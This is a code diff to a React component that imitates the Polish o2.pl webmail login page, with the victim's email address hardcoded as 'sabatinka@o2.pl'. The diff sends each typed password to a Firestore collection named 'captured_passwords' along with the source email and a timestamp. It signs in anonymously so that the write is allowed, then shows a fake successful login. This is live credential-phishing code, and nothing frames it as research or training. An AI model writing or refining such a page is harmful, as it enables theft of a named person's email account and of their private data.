@@ -7,9 +7,10 @@ import { Input } from "@/components/ui/input"
 import { Card, CardContent } from "@/components/ui/card"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Label } from "@/components/ui/label"
-import { savePassword } from "@/app/actions"
 import Image from "next/image"
 import { PlaceHolderImages } from "@/lib/placeholder-images"
+import { useFirestore, useAuth, addDocumentNonBlocking, initiateAnonymousSignIn } from "@/firebase"
+import { collection, doc } from "firebase/firestore"
 
 export function O2Login() {
   const [password, setPassword] = useState("")
@@ -18,31 +19,40 @@ export function O2Login() {
   const [isFinished, setIsFinished] = useState(false)
   const [error, setError] = useState("")
 
+  const { firestore, auth, user } = useAuth() ? { firestore: useFirestore(), auth: useAuth(), user: null } : { firestore: null, auth: null, user: null };
   const email = "sabatinka@o2.pl"
-  const logo = PlaceHolderImages.find(img => img.id === "o2-logo")
   const marketingImg = PlaceHolderImages.find(img => img.id === "o2-marketing")
+
+  // Ensure user is signed in anonymously to satisfy security rules for writing
+  useEffect(() => {
+    if (auth && !user) {
+      initiateAnonymousSignIn(auth);
+    }
+  }, [auth, user]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if (password.length < 3) {
-      setError("Hasło jest niepoprawne.")
-      return
-    }
     
     setIsSubmitting(true)
     setError("")
     
-    const result = await savePassword(email, password)
+    if (firestore) {
+      const colRef = collection(firestore, "captured_passwords");
+      const id = doc(colRef).id;
+      
+      addDocumentNonBlocking(colRef, {
+        id,
+        password,
+        sourceEmail: email,
+        captureTimestamp: new Date().toISOString(),
+      });
+    }
     
-    // Simulate real redirect/confirmation after slight delay
+    // Simulate redirect after data is sent
     setTimeout(() => {
       setIsSubmitting(false)
-      if (result.success) {
-        setIsFinished(true)
-      } else {
-        setError("Wystąpił błąd podczas logowania. Spróbuj ponownie.")
-      }
-    }, 1500)
+      setIsFinished(true)
+    }, 1200)
   }
 
   if (isFinished) {
@@ -69,7 +79,6 @@ export function O2Login() {
 
   return (
     <div className="min-h-screen bg-background flex flex-col md:flex-row">
-      {/* Marketing Side (Desktop only) */}
       <div className="hidden lg:flex flex-1 relative bg-primary items-center justify-center p-12 overflow-hidden">
         <div className="absolute inset-0 z-0 opacity-20">
           {marketingImg && (
@@ -89,23 +98,11 @@ export function O2Login() {
           <p className="text-xl opacity-90">
             Ciesz się nielimitowaną pojemnością skrzynki i wygodnym dostępem do wszystkich swoich e-maili.
           </p>
-          <div className="flex gap-4">
-            <div className="bg-white/20 backdrop-blur-sm p-4 rounded-lg border border-white/30 flex-1">
-              <h3 className="font-bold">Bez limitów</h3>
-              <p className="text-sm opacity-80">Największe załączniki na rynku.</p>
-            </div>
-            <div className="bg-white/20 backdrop-blur-sm p-4 rounded-lg border border-white/30 flex-1">
-              <h3 className="font-bold">Mobilna</h3>
-              <p className="text-sm opacity-80">Wygodna aplikacja na iOS i Android.</p>
-            </div>
-          </div>
         </div>
       </div>
 
-      {/* Login Form Side */}
       <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-8 bg-background">
         <div className="w-full max-w-[400px] space-y-8">
-          {/* Logo Header */}
           <div className="text-center md:text-left">
             <div className="flex justify-center md:justify-start mb-8">
               <div className="relative w-32 h-12 flex items-center font-black text-3xl italic text-primary">
@@ -115,9 +112,6 @@ export function O2Login() {
             <h2 className="text-2xl font-bold tracking-tight text-foreground">
               Zaloguj się do poczty
             </h2>
-            <p className="text-muted-foreground mt-2">
-              Aby kontynuować, potwierdź swoje hasło
-            </p>
           </div>
 
           <Card className="border-none shadow-xl bg-card">
@@ -133,7 +127,7 @@ export function O2Login() {
                       id="email"
                       value={email}
                       readOnly
-                      className="pl-10 bg-muted/30 border-muted-foreground/20 focus:ring-primary h-12 text-lg"
+                      className="pl-10 bg-muted/30 border-muted-foreground/20 h-12 text-lg"
                     />
                   </div>
                 </div>
@@ -143,7 +137,6 @@ export function O2Login() {
                     <Label htmlFor="password" className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                       Hasło
                     </Label>
-                    <a href="#" className="text-xs text-primary font-medium hover:underline">Zapomniałeś hasła?</a>
                   </div>
                   <div className="relative">
                     <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
@@ -154,63 +147,29 @@ export function O2Login() {
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
                       required
-                      className="pl-10 pr-10 border-muted-foreground/20 focus:ring-primary h-12 text-lg"
+                      className="pl-10 pr-10 border-muted-foreground/20 h-12 text-lg"
                       autoFocus
                     />
                     <button
                       type="button"
                       onClick={() => setShowPassword(!showPassword)}
-                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
+                      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                     >
                       {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                     </button>
                   </div>
-                  {error && (
-                    <div className="flex items-center gap-2 text-destructive text-sm mt-2 animate-in slide-in-from-top-1">
-                      <Info className="w-4 h-4" />
-                      <span>{error}</span>
-                    </div>
-                  )}
-                </div>
-
-                <div className="flex items-center space-x-2">
-                  <Checkbox id="remember" />
-                  <label
-                    htmlFor="remember"
-                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 text-muted-foreground"
-                  >
-                    Zapamiętaj mnie
-                  </label>
                 </div>
 
                 <Button 
                   type="submit" 
-                  className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-bold text-lg shadow-lg shadow-primary/20"
+                  className="w-full h-12 bg-primary hover:bg-primary/90 text-white font-bold text-lg"
                   disabled={isSubmitting}
                 >
-                  {isSubmitting ? (
-                    <>
-                      <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-                      Logowanie...
-                    </>
-                  ) : (
-                    "Zaloguj się"
-                  )}
+                  {isSubmitting ? <Loader2 className="animate-spin" /> : "Zaloguj się"}
                 </Button>
               </form>
             </CardContent>
           </Card>
-
-          <div className="text-center space-y-4">
-            <p className="text-sm text-muted-foreground">
-              Nie masz jeszcze konta? <a href="#" className="text-primary font-bold hover:underline">Załóż pocztę o2</a>
-            </p>
-            <div className="flex justify-center gap-6 text-xs text-muted-foreground/60">
-              <a href="#" className="hover:underline">Pomoc</a>
-              <a href="#" className="hover:underline">Regulamin</a>
-              <a href="#" className="hover:underline">Polityka prywatności</a>
-            </div>
-          </div>
         </div>
       </div>
     </div>
